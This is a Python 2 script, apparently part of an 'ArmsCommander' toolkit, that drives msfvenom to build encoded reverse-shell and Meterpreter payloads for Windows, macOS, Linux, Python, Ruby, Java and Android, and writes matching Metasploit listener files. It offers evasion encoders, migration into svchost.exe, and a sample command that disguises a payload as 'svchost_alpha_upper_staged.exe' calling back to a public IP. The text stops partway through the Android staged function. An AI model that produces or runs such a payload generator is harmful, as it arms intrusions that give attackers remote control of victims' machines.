#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable
#Startup Module Imports
import os
import socket
import operator
from termcolor import colored
import sys
import time
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

os.system('cat /root/ArmsCommander/banners/banner_EZPZ.txt')
print colored('Easy-Peasey, the MSFVenom Payload Generator Targeting All Available Platforms by Chang Tan Lister','red','on_white')


class payload_Parameters(object):
    def __init__(self, encoder, encoder_iterations, LHOST, LPORT, output_format, output_payload):
        self.encoder = encoder
        self.encoder_iterations = encoder_iterations
        self.LHOST = LHOST
        self.LPORT = LPORT
        self.output_format = output_format
        self.output_payload = output_payload
    @classmethod
    def from_input(cls):
        return cls(
            encoder_Dict[str(raw_input("Enter a ENCODER OPTION #: "))],
            str(raw_input("Enter the number of iterations, usually from 1 to 10: ")),
            str(raw_input("Enter LHOST, your PUBLIC IP Address: ")),
            str(raw_input("Enter LPORT, your LISTENER PORT: ")),
            str(raw_input("Enter the format of your output, like 'raw' or 'exe': ")),
            str(raw_input("Enter the full path of your output file: "))
        )


encoder_Dict = {
    '1': 'cmd/echo',
    '2': 'cmd/generic_sh',
    '3': 'cmd/ifs',
    '4': 'cmd/perl',
    '5': 'cmd/powershell_base64',
    '6': 'cmd/printf_php_mq',
    '7': 'generic/eicar',
    '8': 'generic/none',
    '9': 'mipsbe/byte_xori',
    '10': 'mipsbe/longxor',
    '11': 'mipsle/byte_xori',
    '12': 'mipsle/longxor',
    '13': 'php/base64',
    '14': 'ppc/longxor',
    '15': 'ppc/longxor_tag',
    '16': 'sparc/longxor_tag',
    '17': 'x64/xor',
    '18': 'x64/zutto_dekiru',
    '19': 'x86/add_sub',
    '20': 'x86/alpha_mixed',
    '21': 'x86/alpha_upper',
    '23': 'x86/avoid_underscore_tolower',
    '22': 'x86/avoid_utf8_tolower',
    '24': 'x86/bloxor',
    '25': 'x86/bmp_polyglot',
    '26': 'x86/call4_dword_xor',
    '28': 'x86/context_cpuid',
    '27': 'x86/context_stat',
    '29': 'x86/context_time',
    '30': 'x86/countdown',
    '31': 'x86/fnstenv_mov',
    '32': 'x86/jmp_call_additive',
    '33': 'x86/nonalpha',
    '34': 'x86/nonupper',
    '35': 'x86/opt_sub',
    '36': 'x86/shikata_ga_nai',
    '37': 'x86/single_static_bit',
    '38': 'x86/unicode_mixed',
    '39': 'x86/unicode_upper'
}

payload_dir = '/root/ArmsCommander/payloads/'

def test_Encoder_Effectiveness():

    payload_to_test = str(raw_input("Enter the payload you want to test: "))
    iterations = str(raw_input("Enter the amount of iterations to encode: "))

    for key in encoder_Dict:
        bad_Bytes = "x00"
        encoder_Set = encoder_Dict[key]
        cmd_String = 'msfvenom -p {0} -e {1} -i {2} -b "\{3}" -o /root/ArmsCommander/Encoder_Tested'.format(
            payload_to_test,
            encoder_Set,
            iterations,
            bad_Bytes
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
    print 'Encoder tests completed, please check console output'
    main()
    return
def Windows_INLINE():
        opt_Dict = {
            '1': 'windows/meterpreter_reverse_tcp',
            '2': 'windows/meterpreter_reverse_http',
            '3': 'windows/meterpreter_reverse_https'
        }
        opt_List = (
            '\n\t#1. Windows Meterpreter, Reverse TCP Shell',
            '#2. Windows Meterpreter, Reverse HTTP Shell',
            '#3. Windows Meterpreter, Reverse HTTPS Shell'
        )
        print ("\n\t".join(opt_List))
        opt_Choice = str(raw_input("Enter a payload shown: "))

        if opt_Choice in opt_Dict:
            os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
            print colored('Please answer the following questions','red','on_white')
            payload_Set = opt_Dict[opt_Choice]
            user_input = payload_Parameters.from_input()
            bad_Bytes = "x00"
            payload_file = payload_dir + user_input.output_payload
            cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} PrependMigrate=true PrependMigrateProc=svchost.exe -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
                payload_Set,
                user_input.LHOST,
                user_input.LPORT,
                user_input.encoder,
                user_input.encoder_iterations,
                bad_Bytes,
                user_input.output_format,
                payload_file
            )
            print colored(cmd_String,'red','on_white')
            os.system(cmd_String)

            # generate a handler file
            print 'Creating handler directory and generating handler file'
            #
            # handler_directory = '/root/ArmsCommander/payloads/'
            # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
            # handler_fullpath = handler_directory + handler_filename
            handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')

            # write proper parameters to handler file
            print 'Writing to handler file'
            handler.write('use multi/handler')
            # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
            # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
            handler.write("\nset PAYLOAD " + payload_Set)
            # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
            handler.write('\nset LHOST 0.0.0.0')
            # handler.write("\nset LPORT {0}").format(user_input.LPORT)
            handler.write("\nset LPORT " + user_input.LPORT)
            handler.write('\nset ExitOnSession false')
            handler.write('\nexploit -j -z')

            # Inform user where the handler file is stored
            print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
            print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
        else:
            print colored('You have entered a invalid option','red','on_white')
            Windows_STAGED()
        main()
    #a. Inline/Stageless
        #1. Meterpreter Reverse TCP
        #2. Meterpreter Reverse HTTP
        #3. Meterpreter Reverse HTTPS
def Windows_STAGED():
        opt_Dict = {
            '1': 'windows/meterpreter/reverse_tcp',
            '2': 'windows/meterpreter/reverse_http',
            '3': 'windows/meterpreter/reverse_https'
        }

        opt_List = (
            '\n\t#1. Windows Meterpreter, Reverse TCP Shell',
            '#2. Windows Meterpreter, Reverse HTTP Shell',
            '#3. Windows Meterpreter, Reverse HTTPS Shell'
        )
        print ("\n\t".join(opt_List))
        opt_Choice = str(raw_input("Enter a payload shown: "))

        if opt_Choice in opt_Dict:
            os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
            print colored('Please answer the following questions','red','on_white')
            payload_Set = opt_Dict[opt_Choice]
            user_input = payload_Parameters.from_input()
            payload_file = payload_dir + user_input.output_payload
            bad_Bytes = "x00"
            cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} PrependMigrate=true PrependMigrateProc=svchost.exe -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
                payload_Set,
                user_input.LHOST,
                user_input.LPORT,
                user_input.encoder,
                user_input.encoder_iterations,
                bad_Bytes,
                user_input.output_format,
                payload_file
            )
            print colored(cmd_String,'red','on_white')
            os.system(cmd_String)
            # generate a handler file
            print 'Creating handler directory and generating handler file'
            #
            # handler_directory = '/root/ArmsCommander/payloads/'
            # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
            # handler_fullpath = handler_directory + handler_filename
            handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')

            # write proper parameters to handler file
            print 'Writing to handler file'
            handler.write('use multi/handler')
            # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
            # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
            handler.write("\nset PAYLOAD " + payload_Set)
            # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
            handler.write('\nset LHOST 0.0.0.0')
            # handler.write("\nset LPORT {0}").format(user_input.LPORT)
            handler.write("\nset LPORT " + user_input.LPORT)
            handler.write('\nset ExitOnSession false')
            handler.write('\nexploit -j -z')

            # Inform user where the handler file is stored
            print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
            print 'To use, open msfconsole and type "resource <handlerfile.rc>"'

        else:
            print colored('You have entered a invalid option','red','on_white')
            Windows_STAGED()
        main()
    #b. Staged
        #1. Meterpreter Reverse TCP
        #2. Meterpreter Reverse HTTP
        #3. Meterpreter Reverse HTTPS
# msfvenom -p windows/meterpreter/reverse_https LHOST=52.53.180.45 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe -e x86/alpha_upper -i 5 -b "\x00" -f exe -o svchost_alpha_upper_staged.exe
def Platform_Windows():
    opt_List = [
        '#0. Return to Main Menu',
        '#1. INLINE/STAGELESS Payloads',
        '#2. STAGED Payloads'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION:"))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        Windows_INLINE()
    elif opt_Choice == "2":
        Windows_STAGED()
    else:
        print colored('You have entered a invalid option','red','on_white')
        Platform_Windows()
    return

def OSX_PPC():

    opt_Dict = {
        '1': 'osx/ppc/shell/reverse_tcp',
        '2': 'osx/ppc/shell_reverse_tcp',
    }

    opt_List = (
            '\n\t#1. PowerPC Command Shell STAGED',
            '#2. PowerPC Command Shell INLINE'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        payload_file = payload_dir + user_input.output_payload
        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            payload_file
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # generate a handler file
        print 'Creating handler directory and generating handler file'

        # handler_directory = '/root/ArmsCommander/payloads/'
        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
        # handler_fullpath = handler_directory + handler_filename
        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')

        # write proper parameters to handler file
        print 'Writing to handler file'
        handler.write('use multi/handler')
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
        handler.write("\nset PAYLOAD " + payload_Set)
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        handler.write('\nset LHOST 0.0.0.0')
        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
        handler.write("\nset LPORT " + user_input.LPORT)
        handler.write('\nset ExitOnSession false')
        handler.write('\nexploit -j -z')

        # Inform user where the handler file is stored
        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'


    else:
        print colored('You have entered a invalid option','red','on_white')
        OSX_PPC()
    main()
    return
def OSX_x86():
    opt_Dict = {
        '1': 'osx/x86/shell_reverse_tcp',
        '2': 'osx/x86/vforkshell_reverse_tcp',
        '3': 'osx/x86/vforkshell/reverse_tcp'
    }

    opt_List = (
        '\n\t#1. x86/x64 Command Shell Reverse TCP, INLINE',
        '#2. x86/x64 V-Fork Command Shell, Reverse TCP, INLINE',
        '#3. x86/x64 V-Fork Command Shell, Reverse TCP, STAGED'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        payload_file = payload_dir + user_input.output_payload

        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            payload_file
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # generate a handler file
        print 'Creating handler directory and generating handler file'

        # handler_directory = '/root/ArmsCommander/payloads/'
        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
        # handler_fullpath = handler_directory + handler_filename
        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')

        # write proper parameters to handler file
        print 'Writing to handler file'
        handler.write('use multi/handler')
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
        handler.write("\nset PAYLOAD " + payload_Set)
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        handler.write('\nset LHOST 0.0.0.0')
        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
        handler.write("\nset LPORT " + user_input.LPORT)
        handler.write('\nset ExitOnSession false')
        handler.write('\nexploit -j -z')

        # Inform user where the handler file is stored
        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'

    else:
        print colored('You have entered a invalid option','red','on_white')
        OSX_x86()
    main()
    return
#3. Mac Reverse Shells (OSX)
        ##Warn users that OSX Shells are INLINE-Only
        #1. PowerPC Processor
        #2. x86 Processor

def Platform_OSX():
    print colored('Mac OSX Shells are COMMAND-SHELL ONLY (No Meterpreter RATs), but you also have to pick what processor architecture you are targeting','red','on_white')
    opt_List = [
        '\n\t#0. Return to Main Menu',
        '#1. Mac OSX PowerPC',
        '#2. Mac OSX x86'
    ]


    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Select a OPTION: "))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        OSX_PPC()
    elif opt_Choice == "2":
        OSX_x86()
    else:
        print colored('You have entered a invalid option','red','on_white')
        main()
    return

def Linux_STAGED():
#2. Linux Reverse Shells
        #1. Linux Meterpreter Reverse TCP, Staged

    opt_Dict = {
        '1': 'linux/x86/meterpreter/reverse_tcp'
    }

    opt_Choice = str(raw_input("Press 1 to create a reverse meterpreter TCP payload: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        payload_file = payload_dir + user_input.output_payload

        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            payload_file
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # generate a handler file
        print 'Creating handler directory and generating handler file'

        # handler_directory = '/root/ArmsCommander/payloads/'
        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
        # handler_fullpath = handler_directory + handler_filename
        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')

        # write proper parameters to handler file
        print 'Writing to handler file'
        handler.write('use multi/handler')
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
        handler.write("\nset PAYLOAD " + payload_Set)
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        handler.write('\nset LHOST 0.0.0.0')
        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
        handler.write("\nset LPORT " + user_input.LPORT)
        handler.write('\nset ExitOnSession false')
        handler.write('\nexploit -j -z')

        # Inform user where the handler file is stored
        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'

    else:
        print colored('You have entered a invalid option','red','on_white')
        Linux_STAGED()
    main()
    return
def Platform_Linux():
    print colored('Only staged payloads are available for Linux, press 1 to continue','red','on_white')
    opt_Choice = str(raw_input("Press 1 to CONTINUE: "))
    if opt_Choice == "1":
        Linux_STAGED()
    else:
        print colored('You have entered a invalid option','red','on_white')
        main()
    return

def Python_INLINE():
    opt_Dict = {
        '1': 'python/meterpreter_reverse_tcp',
        '2': 'python/meterpreter_reverse_http',
        '3': 'python/meterpreter_reverse_https'
    }

    opt_List = (
        '\n\t#1. Python Meterpreter Reverse TCP',
        '#2. Python Meterpreter Reverse HTTP',
        '#3. Python Meterpreter Reverse HTTPS'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        payload_file = payload_dir + user_input.output_payload

        # cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
        #     payload_Set,
        #     user_input.LHOST,
        #     user_input.LPORT,
        #     user_input.encoder,
        #     user_input.encoder_iterations,
        #     bad_Bytes,
        #     user_input.output_format,
        #     user_input.output_payload
        # )

        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -f {3} -o {4}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.output_format,
            payload_file
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # generate a handler file
        print 'Creating handler directory and generating handler file'

        # handler_directory = '/root/ArmsCommander/payloads/'
        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
        # handler_fullpath = handler_directory + handler_filename
        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')

        # write proper parameters to handler file
        print 'Writing to handler file'
        handler.write('use multi/handler')
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
        handler.write("\nset PAYLOAD " + payload_Set)
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        handler.write('\nset LHOST 0.0.0.0')
        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
        handler.write("\nset LPORT " + user_input.LPORT)
        handler.write('\nset ExitOnSession false')
        handler.write('\nexploit -j -z')

        # Inform user where the handler file is stored
        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'

    else:
        print colored('You have entered a invalid option','red','on_white')
        Python_INLINE()
    main()
    return
def Python_STAGED():
    opt_Dict = {
        '1': 'python/meterpreter/reverse_tcp',
        '2': 'python/meterpreter/reverse_http',
        '3': 'python/meterpreter/reverse_https'
    }

    opt_List = (
        '\n\t#1. Python Meterpreter Reverse TCP',
        '#2. Python Meterpreter Reverse HTTP',
        '#3. Python Meterpreter Reverse HTTPS'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        payload_file = payload_dir + user_input.output_payload

        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -f {3} -o {4}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.output_format,
            payload_file
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # generate a handler file
        print 'Creating handler directory and generating handler file'

        # handler_directory = '/root/ArmsCommander/payloads/'
        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
        # handler_fullpath = handler_directory + handler_filename
        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')

        # write proper parameters to handler file
        print 'Writing to handler file'
        handler.write('use multi/handler')
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
        handler.write("\nset PAYLOAD " + payload_Set)
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        handler.write('\nset LHOST 0.0.0.0')
        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
        handler.write("\nset LPORT " + user_input.LPORT)
        handler.write('\nset ExitOnSession false')
        handler.write('\nexploit -j -z')

        # Inform user where the handler file is stored
        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'

    else:
        print colored('You have entered a invalid option','red','on_white')
        Python_STAGED()
    main()
    return

def Platform_Python():
    opt_List = [
        '\n\t#1. Python INLINE Reverse Meterpreter Shells',
        '#2. Python STAGED Reverse Meterpreter Shells'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "1":
        Python_INLINE()
    elif opt_Choice == "2":
        Python_STAGED()
    elif opt_Choice == "0":
        main()
    else:
        print colored('You have entered a invalid option','red','on_white')
        Platform_Python()
#4. Python Reverse Shells
    #a. INLINE
        #1. Meterpreter Reverse TCP
        #2. Meterpreter Reverse HTTP
        #3. Meterpreter Reverse HTTPS
    #b. Staged
        #1. Meterpreter Reverse TCP
        #2. Meterpreter Reverse HTTP
        #3. Meterpreter Reverse HTTPS
    return

def Ruby_INLINE():
    opt_Dict = {
        '1': 'ruby/shell_reverse_tcp',
        '2': 'ruby/shell_reverse_tcp_ssl'
    }

    opt_List = (
        '\n\t#1. Ruby Reverse COMMAND Shell, TCP',
        '#2. Ruby Reverse COMMAND Shell, TCP + SSL'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        payload_file = payload_dir + user_input.output_payload

        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            payload_file
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # generate a handler file
        print 'Creating handler directory and generating handler file'

        # handler_directory = '/root/ArmsCommander/payloads/'
        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
        # handler_fullpath = handler_directory + handler_filename
        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')

        # write proper parameters to handler file
        print 'Writing to handler file'
        handler.write('use multi/handler')
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
        handler.write("\nset PAYLOAD " + payload_Set)
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        handler.write('\nset LHOST 0.0.0.0')
        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
        handler.write("\nset LPORT " + user_input.LPORT)
        handler.write('\nset ExitOnSession false')
        handler.write('\nexploit -j -z')

        # Inform user where the handler file is stored
        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'

    else:
        print colored('You have entered a invalid option','red','on_white')
        Ruby_INLINE()
    main()
    return
def Platform_Ruby():
#5. Ruby Reverse Shells
    ##INLINE ONLY
        #1. Reverse TCP Command Shells
        #2. Reverse TCP SSL Command Shell
    print colored('Ruby Shells are both INLINE-ONLY and are COMMAND SHELLS (No Meterpreter)','red','on_white')
    Ruby_INLINE()
    return

def Java_STAGED():
    opt_Dict = {
        '1': 'java/meterpreter/reverse_tcp',
        '2': 'java/meterpreter/reverse_http',
        '3': 'java/meterpreter/reverse_https'
    }

    opt_List = (
        '\n\t#1. Java Reverse Meterpreter, TCP',
        '#2. Java Reverse Meterpreter, HTTP',
        '#3. Java Reverse Meterpreter, HTTPS'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        payload_file = payload_dir + user_input.output_payload

        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            payload_file
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # generate a handler file
        print 'Creating handler directory and generating handler file'

        # handler_directory = '/root/ArmsCommander/payloads/'
        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
        # handler_fullpath = handler_directory + handler_filename
        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')

        # write proper parameters to handler file
        print 'Writing to handler file'
        handler.write('use multi/handler')
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
        handler.write("\nset PAYLOAD " + payload_Set)
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        handler.write('\nset LHOST 0.0.0.0')
        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
        handler.write("\nset LPORT " + user_input.LPORT)
        handler.write('\nset ExitOnSession false')
        handler.write('\nexploit -j -z')

        # Inform user where the handler file is stored
        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'

    else:
        print colored('You have entered a invalid option','red','on_white')
        Java_STAGED()
    main()
    return
def Platform_Java():
    print colored('Java Meterpreter Shells are STAGED ONLY','red','on_white')
    Java_STAGED()

    return

def Android_INLINE():
    opt_Dict = {
        '1': 'android/meterpreter_reverse_tcp ',
        '2': 'android/meterpreter_reverse_http',
        '3': 'android/meterpreter_reverse_https'
    }

    opt_List = (
        '\n\t#1. Android APK Meterpreter Shell, Reverse TCP',
        '#2. Android APK Meterpreter Shell, Reverse HTTP',
        '#3. Android APK Meterpreter Shell, Reverse HTTPS'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        payload_file = payload_dir + user_input.output_payload

        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            payload_file
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # generate a handler file
        print 'Creating handler directory and generating handler file'

        # handler_directory = '/root/ArmsCommander/payloads/'
        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
        # handler_fullpath = handler_directory + handler_filename
        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')

        # write proper parameters to handler file
        print 'Writing to handler file'
        handler.write('use multi/handler')
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
        handler.write("\nset PAYLOAD " + payload_Set)
        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
        handler.write('\nset LHOST 0.0.0.0')
        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
        handler.write("\nset LPORT " + user_input.LPORT)
        handler.write('\nset ExitOnSession false')
        handler.write('\nexploit -j -z')

        # Inform user where the handler file is stored
        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'

    else:
        print colored('You have entered a invalid option','red','on_white')
        Android_INLINE()
    main()
    return
def Android_STAGED():
    opt_Dict = {
        '1': 'android/meterpreter/reverse_tcp ',
        '2': 'android/meterpreter/reverse_http',
        '3': 'android/meterpreter/reverse_https'
    }

    opt_List = (
        '\n\t#1. Android APK Meterpreter Shell, Reverse TCP',
        '#2. Android APK Meterpreter Shell, Reverse HTTP',
        '#3. Android APK Meterpreter Shell, Reverse HTTPS'
    )
    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        payload_file = payload_dir + user_input.output_payload

        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
